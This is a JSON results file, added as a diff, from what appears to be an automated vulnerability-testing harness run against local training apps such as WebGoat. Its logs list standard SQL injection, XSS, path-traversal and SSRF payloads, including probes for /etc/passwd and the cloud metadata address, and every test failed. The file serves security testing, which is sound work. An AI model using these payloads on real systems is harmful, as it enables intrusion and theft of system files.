@@ -1,0 +1,85 @@
+{
+  "timestamp": "2025-10-11T18:47:26.212117",
+  "total_tests": 4,
+  "completed": 4,
+  "skipped": 0,
+  "errors": 0,
+  "validated": 0,
+  "success_rate": 0.0,
+  "total_duration_seconds": 4.91987681388855,
+  "results": [
+    {
+      "test_name": "sql_injection",
+      "status": "completed",
+      "exploit_result": {
+        "exploit_id": "cwe_89_sql_injection",
+        "category": "sql_injection",
+        "status": "failed",
+        "success": false,
+        "output": "Testing payload: 1' UNION SELECT NULL,NULL,NULL--...\n  No indicators found (status: 302)\nTesting payload: 1' UNION SELECT 'SQLi','test','success'--...\n  No indicators found (status: 302)\nTesting payload: 1' UNION SELECT database(),user(),version()--...\n  No indicators found (status: 302)\nTesting payload: 1' AND '1'='1...\n  No indicators found (status: 302)\nTesting payload: 1' AND '1'='2...\n  No indicators found (status: 302)\nTesting payload: 1' OR '1'='1...\n  No indicators found (status: 302)\nTesting payload: 1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a...\n  No indicators found (status: 302)\n\u2717 No SQL injection detected (likely patched)",
+        "error": null,
+        "duration_seconds": 0.04681801795959473,
+        "metadata": {
+          "target_url": "http://localhost:8081/vulnerabilities/sqli/"
+        }
+      },
+      "expected_vulnerable": true,
+      "validation_passed": false,
+      "duration_seconds": 0.11255550384521484
+    },
+    {
+      "test_name": "xss",
+      "status": "completed",
+      "exploit_result": {
+        "exploit_id": "cwe_79_xss",
+        "category": "xss",
+        "status": "failed",
+        "success": false,
+        "output": "Testing XSS payload: <script>alert('XSS')</script>...\n  Payload not reflected or escaped\nTesting XSS payload: <img src=x onerror=alert('XSS')>...\n  Payload not reflected or escaped\nTesting XSS payload: <svg/onload=alert('XSS')>...\n  Payload not reflected or escaped\nTesting XSS payload: javascript:alert('XSS')...\n  Payload not reflected or escaped\nTesting XSS payload: <iframe src='javascript:alert(\"XSS\")'></...\n  Payload not reflected or escaped\n\u2717 No XSS vulnerability detected (likely patched)",
+        "error": null,
+        "duration_seconds": 0.11283278465270996,
+        "metadata": {
+          "target_url": "http://localhost:8082/WebGoat/start.mvc"
+        }
+      },
+      "expected_vulnerable": true,
+      "validation_passed": false,
+      "duration_seconds": 0.6202540397644043
+    },
+    {
+      "test_name": "path_traversal",
+      "status": "completed",
+      "exploit_result": {
+        "exploit_id": "cwe_22_path_traversal",
+        "category": "path_traversal",
+        "status": "failed",
+        "success": false,
+        "output": "Testing: ../../../etc/passwd...\n  No indicators found\nTesting: ..\\..\\..\\windows\\system.ini...\n  No indicators found\nTesting: ....//....//....//etc/passwd...\n  No indicators found\nTesting: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc...\n  No indicators found\n\u2717 No path traversal detected (likely patched)",
+        "error": null,
+        "duration_seconds": 0.0384984016418457,
+        "metadata": {}
+      },
+      "expected_vulnerable": true,
+      "validation_passed": false,
+      "duration_seconds": 0.07596659660339355
+    },
+    {
+      "test_name": "ssrf",
+      "status": "completed",
+      "exploit_result": {
+        "exploit_id": "cwe_918_ssrf",
+        "category": "ssrf",
+        "status": "failed",
+        "success": false,
+        "output": "Testing SSRF: http://localhost...\n  No indicators found\nTesting SSRF: http://127.0.0.1...\n  No indicators found\nTesting SSRF: http://0.0.0.0...\n  No indicators found\nTesting SSRF: http://[::1]...\n  No indicators found\nTesting SSRF: http://169.254.169.254...\n  No indicators found\nTesting SSRF: http://192.168.1.1...\n  No indicators found\nTesting SSRF: file:///etc/passwd...\n  No indicators found\n\u2717 No SSRF detected (likely patched)",
+        "error": null,
+        "duration_seconds": 0.06931948661804199,
+        "metadata": {}
+      },
+      "expected_vulnerable": true,
+      "validation_passed": false,
+      "duration_seconds": 0.10807466506958008
+    }
+  ],
+  "overall_status": "\u274c ALL TESTS FAILED"
+}
